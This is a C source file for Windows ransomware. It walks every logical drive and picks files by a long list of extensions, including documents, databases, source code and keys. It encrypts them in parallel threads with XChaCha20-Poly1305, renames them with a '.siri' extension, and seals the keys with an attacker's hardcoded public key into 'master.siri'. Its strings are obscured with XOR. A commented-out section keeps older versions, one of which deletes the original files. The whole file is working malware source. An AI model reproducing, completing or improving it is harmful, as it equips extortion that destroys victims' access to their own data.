#include "encrypt.hpp"

Node *node = NULL;

const char *blacklistFolders[] = {
	"AppData",
	"Windows",
	"Programs Files(x86)"};

const char *whitelistFileTypes[] = {
	"js", "sln", "suo", "cs", "c", "cpp",
	"ps1", "vbs", "vb", "pl", "jsp", "php",
	"mat", "kys", "pif", "scf", "shs", "xnx",
	"mp3", "wav", "swf", "fla", "wmv", "mpg",
	"3gp", "mkv", "3g2", "flv", "raw", "gif",
	"txt", "csv", "lua", "vbs", "vb6", "apk",
	"bmp", "eps", "hdr", "exr", "ico", "tga",
	"accdb", "mdb", "db", "bat", "lnk", "url",
	"png", "bmp", "jpg", "jpeg", "vcd", "iso",
	"asp", "rb", "java", "jar", "class", "sh",
	"vob", "mpeg", "asf", "avi", "mov", "mp4",
	"backup", "zip", "rar", "7z", "gz", "tgz",
	"ta", "pdf", "pptx", "ppt", "xltm", "pptx",
	"xltx", "xlc", "xlm", "xlt", "xlw", "xlsb",
	"xlsx", "xls", "docx", "doc", "htm", "html",
	"php5", "php", "phtml", "fla", "ink", "exe",
	"pas", "h", "asm", "sqlite3", "sqlitedb", "sql",
	"config", "resx", "vbproj", "cache", "pdb", "manifest",
	"tiff", "wbmp", "webp", "md", "pem", "hpp",
	"xml", "key", "py", "rs"};

const char *blacklistFiles[] = {
	"keys.siri",
	"master.siri"};

void freeArgs(Args *args)
{
	// Free memory allocated for file paths
	freeFilePaths(&args->fp);
	// No need to free keyiv as it's not dynamically allocated
}

KeyIV genKeyIv()
{
	KeyIV keyiv;
	randombytes_buf(keyiv.key, KEY_LENGTH);
	randombytes_buf(keyiv.iv, IV_LENGTH);
	keyiv.keyLength = KEY_LENGTH;
	keyiv.ivLength = IV_LENGTH;
	return keyiv;
}

KeyIV *genIV(KeyIV *keyiv)
{
	randombytes_buf(keyiv->iv, IV_LENGTH);
	return keyiv;
}

char *XOR(char *data, char key)
{
	int dataLen = strlen(data);
	char *output = (char *)malloc(sizeof(char) * dataLen);

	for (int i = 0; i < dataLen; ++i)
	{
		output[i] = data[i] ^ key;
	}

	output[dataLen] = '\0';

	return output;
}

char *deXOR(char *hex, char *key)
{
	size_t ciphertext_len = strlen(hex) / 2;
	unsigned char *ciphertext = (unsigned char *)malloc(ciphertext_len);
	for (size_t i = 0; i < ciphertext_len; ++i)
	{
		sscanf(hex + 2 * i, "%2hhx", &ciphertext[i]);
	}

	int key_len = strlen(key);
	char *decrypted = (char *)malloc(ciphertext_len + 1);

	for (size_t i = 0; i < ciphertext_len; ++i)
	{
		decrypted[i] = ciphertext[i] ^ key[i % key_len];
	}

	decrypted[ciphertext_len] = '\0';

	free(ciphertext);

	return decrypted;
}

Cipher chacha(KeyIV keyiv, File file, size_t size)
{
	Cipher cipher;
	cipher.text = (unsigned char *)malloc(file.size + crypto_aead_xchacha20poly1305_ietf_ABYTES);
	if (crypto_aead_xchacha20poly1305_ietf_encrypt_detached(cipher.text, cipher.tag, NULL,
															file.text, size,
															NULL, 0,
															NULL, keyiv.iv, keyiv.key) != 0)
	{
		// printf("Encryption failed\n");
		free(cipher.text);
		cipher.text = NULL;
	}

	cipher.size = file.size;

	return cipher;
}

Meta fileEncrypt(KeyIV keyiv, const char *filename)
{
	File file = read(filename);
	Meta data;

	// skip files larger than 100mb
	if (file.size > (1024 * 1024 * 100))
	{
		free(file.text);
		data.filename = NULL;
		return data;
	}

	if (file.text == NULL)
	{
		free(file.text);
		data.filename = NULL;
		return data;
	}

	Cipher cipher = chacha(keyiv, file, file.size);
	if (cipher.text == NULL)
	{
		free(file.text);
		free(cipher.text);
		data.filename = NULL;
		return data;
	}

	const size_t filename_length = strlen(filename);
	const size_t nfilename_length = filename_length + 5 + 1;
	char *nfilename = (char *)malloc(nfilename_length);

	if (nfilename == NULL)
	{
		free(file.text);
		free(nfilename);
		free(cipher.text);
		data.filename = NULL;
		return data;
	}

	strcpy(nfilename, filename);
	strcat(nfilename, sXOR(".siri"));

	rename(filename, nfilename);

	BOOL success = write(cipher, nfilename);
	if (success == 1)
	{
		free(file.text);
		free(nfilename);
		free(cipher.text);
		data.filename = NULL;
		return data;
	}

	data.keyiv = keyiv;
	data.filename = filename;
	memcpy(data.tag, cipher.tag, crypto_aead_xchacha20poly1305_ietf_ABYTES);

	free(file.text);
	free(nfilename);
	free(cipher.text);

	return data;
}

DWORD WINAPI enc(LPVOID lpParam)
{
	Args *args = (Args *)lpParam;
	for (size_t j = 0; j < args->fp.count; ++j)
	{
		Meta data = fileEncrypt(args->keyiv, args->fp.paths[j]);
		if (data.filename != NULL)
		{
			genIV(&args->keyiv);
			unshift(&node, data);
		}
		else
		{
			continue;
		}
	}
	return 0;
}

char *thread(const char *directory)
{
	SYSTEM_INFO sys_info;
	GetNativeSystemInfo(&sys_info);
	DWORD yarnNo = sys_info.dwNumberOfProcessors * 2 - 2;
	KeyIV keyiv = genKeyIv();
	size_t numBlacklistFolders = sizeof(blacklistFolders) / sizeof(blacklistFolders[0]);
	size_t numWhitelistFileTypes = sizeof(whitelistFileTypes) / sizeof(whitelistFileTypes[0]);
	size_t numBlacklistFiles = sizeof(blacklistFiles) / sizeof(blacklistFiles[0]);

	FilePaths filePaths;
	initializeFilePaths(&filePaths);

	listFilesRecursively(directory, &filePaths, blacklistFolders, numBlacklistFolders, whitelistFileTypes, numWhitelistFileTypes, blacklistFiles, numBlacklistFiles);

	size_t pathsPerThread = filePaths.count / yarnNo;
	size_t remainder = filePaths.count % yarnNo;
	size_t startIdx = 0;

	HANDLE threadHandles[yarnNo];
	Args *threadArgs[yarnNo];
	for (int i = 0; i < yarnNo; ++i)
	{
		size_t threadPaths = pathsPerThread + (i < remainder ? 1 : 0);

		// printf("threadPaths: %i\n", threadPaths);
		FilePaths threadFilePaths = {
			.paths = &filePaths.paths[startIdx],
			.count = threadPaths,
			.capacity = threadPaths};

		Args *args = (Args *)malloc(sizeof(Args)); // Allocate memory for Args structure
		if (args == NULL)
		{
			fprintf(stderr, "Error allocating memory for Args structure\n");
			// Handle error
		}
		args->keyiv = keyiv;
		args->fp = threadFilePaths;

		threadArgs[i] = args;

		threadHandles[i] = CreateThread(NULL, 0, enc, args, 0, NULL);
		if (threadHandles[i] == NULL)
		{
			fprintf(stderr, "Error creating thread %d\n", i);
		}

		startIdx += threadPaths;
	}

	WaitForMultipleObjects(yarnNo, threadHandles, TRUE, INFINITE);
	for (int i = 0; i < yarnNo; ++i)
	{
		CloseHandle(threadHandles[i]);
		// freeArgs(threadArgs[i]); // Free memory allocated for Args structure
		// free(threadArgs[i]); // Free memory allocated for Args pointer
	}

	char *json = serializeLinkedList(node);

	free(node);
	return json;
}

char *encryptDisk()
{
	const DWORD bufferSize = 1024;
	TCHAR buffer[bufferSize];
	DWORD len = GetLogicalDriveStrings(bufferSize, buffer);
	if (len > 0 && len <= bufferSize)
	{
		TCHAR *drive = buffer;

		size_t totalLength = 0;
		while (*drive)
		{
			totalLength += _tcslen(drive) + 2; // Account for newline and null terminator
			drive += _tcslen(drive) + 1;
		}

		char *driveStrings = (char *)malloc(totalLength);
		if (driveStrings)
		{
			drive = buffer;

			char *currentPosition = driveStrings;
			while (*drive)
			{
				char *str = thread(drive);
				if (str)
				{
					strcpy(currentPosition, str);
					currentPosition += strlen(str);
					*currentPosition++ = '\n';
					free(str); // Free the temporary memory allocated by visit()
				}
				drive += _tcslen(drive) + 1;
			}
			*(currentPosition - 1) = '\0';
			return driveStrings;
		}
		else
		{
			// printf("Memory allocation failed.\n");
			return NULL;
		}
	}
	else
	{
		// printf("Failed to retrieve logical drive information.\n");
		return NULL;
	}
}

void sealKeys(char *data)
{
	size_t len = strlen(data);
	Node *node = NULL;
	KeyIV keyiv = genKeyIv();
	ServerKeys serverkey = makeServerKeys(PUBLIC_KEY, PUBLIC_KEY);

	File file = {
		(unsigned char *)data,
		len};

	Cipher cipher = chacha(keyiv, file, file.size);

	write(cipher, sXOR("keys.siri"));

	Meta dta = {
		keyiv,
		sXOR("master.siri")};

	memcpy(dta.tag, cipher.tag, crypto_aead_xchacha20poly1305_ietf_ABYTES);

	unshift(&node, dta);

	char *text = serializeLinkedList(node);

	unsigned char ciphertext[crypto_box_SEALBYTES + len];
	if (crypto_box_seal(ciphertext, (const unsigned char *)data, len, serverkey.public_key) != 0)
	{
		exit(EXIT_FAILURE);
	}

	FILE *file2 = fopen(sXOR("master.siri"), "w");
	fprintf(file2, "%s", ciphertext);

	fclose(file2);

	free(text);
	free(node);
}

////////////////////////////////////////////////////////////////////////////////////////////
//
//
//		Burial ground
//
//
//
///////////////////////////////////////////////////////////////////////////////////////////

/*
char *encryptFolder(const char *directory)
{
	Node *node = NULL;
	KeyIV keyiv = genKeyIv();

	const char *blacklistFolders[] = {"AppData", "home", "Windows", "Programs Files(x86)"};
	size_t numBlacklistFolders = sizeof(blacklistFolders) / sizeof(blacklistFolders[0]);

	const char *whitelistFileTypes[] = {"txt"};
	size_t numWhitelistFileTypes = sizeof(whitelistFileTypes) / sizeof(whitelistFileTypes[0]);

	const char *blacklistFiles[] = {"hawkid.txt", "1804.exe", "1805.exe", "1806.exe"};
	size_t numBlacklistFiles = sizeof(blacklistFiles) / sizeof(blacklistFiles[0]);

	FilePaths filePaths;
	initializeFilePaths(&filePaths);

	listFilesRecursively(directory, &filePaths, blacklistFolders, numBlacklistFolders, whitelistFileTypes, numWhitelistFileTypes, blacklistFiles, numBlacklistFiles);

	for (size_t i = 0; i < filePaths.count; ++i)
	{
		Meta data = fileEncrypt(keyiv, filePaths.paths[i]);
		if (data.filename == NULL)
			continue;
		remove(filePaths.paths[i]);
		genIV(&keyiv);
		unshift(&node, data);
	}

	char *json = serializeLinkedList(node);

	free(node);
	freeFilePaths(&filePaths);

	return json;
}

char *findDisk()
{
	const DWORD bufferSize = 1024;
	TCHAR buffer[bufferSize];
	DWORD len = GetLogicalDriveStrings(bufferSize, buffer);
	if (len > 0 && len <= bufferSize)
	{
		TCHAR *drive = buffer;

		size_t totalLength = 0;
		while (*drive)
		{
			totalLength += _tcslen(drive) + 2; // Account for newline and null terminator
			drive += _tcslen(drive) + 1;
		}

		char *driveStrings = (char *)malloc(totalLength);
		if (driveStrings)
		{
			drive = buffer;

			char *currentPosition = driveStrings;
			while (*drive)
			{
				size_t len = _tcslen(drive);
				char *str = (char *)malloc(len + 1);
				if (str)
				{
					_tcstombs(str, drive, len + 1);
					strcpy(currentPosition, str);
					currentPosition += strlen(str);
					*currentPosition++ = '\n';
					free(str); // Free the temporary memory allocated by visit()
				}
				drive += _tcslen(drive) + 1;
			}
			if (currentPosition > driveStrings)
				*(currentPosition - 1) = '\0'; // Ensure there's at least one character before decrementing
			else
				*currentPosition = '\0'; // Set null terminator if no characters were copied
			return driveStrings;
		}
		else
		{
			// printf("Memory allocation failed.\n");
			return NULL;
		}
	}
	else
	{
		// printf("Failed to retrieve logical drive information.\n");
		return NULL;
	}
}

#include <windows.h>
#include <tchar.h>
#include <stdio.h>

char *findDisk()
{
	const DWORD bufferSize = 1024;
	TCHAR buffer[bufferSize];
	DWORD len = GetLogicalDriveStrings(bufferSize, buffer);
	if (len > 0 && len <= bufferSize)
	{
		TCHAR *drive = buffer;

		size_t totalLength = 0;
		while (*drive)
		{
			UINT driveType = GetDriveType(drive);
			if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOTE)
			{
				totalLength += _tcslen(drive) + 2; // Account for newline and null terminator
			}
			drive += _tcslen(drive) + 1;
		}

		char *driveStrings = (char *)malloc(totalLength);
		if (driveStrings)
		{
			drive = buffer;

			char *currentPosition = driveStrings;
			while (*drive)
			{
				UINT driveType = GetDriveType(drive);
				if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOTE)
				{
					size_t len = _tcslen(drive);
					char *str = (char *)malloc(len + 1);
					if (str)
					{
						_tcstombs(str, drive, len + 1);
						strcpy(currentPosition, str);
						currentPosition += strlen(str);
						*currentPosition++ = '\n';
						free(str); // Free the temporary memory allocated by visit()
					}
				}
				drive += _tcslen(drive) + 1;
			}
			if (currentPosition > driveStrings)
				*(currentPosition - 1) = '\0'; // Ensure there's at least one character before decrementing
			else
				*currentPosition = '\0'; // Set null terminator if no characters were copied
			return driveStrings;
		}
		else
		{
			// printf("Memory allocation failed.\n");
			return NULL;
		}
	}
	else
	{
		// printf("Failed to retrieve logical drive information.\n");
		return NULL;
	}
}


*/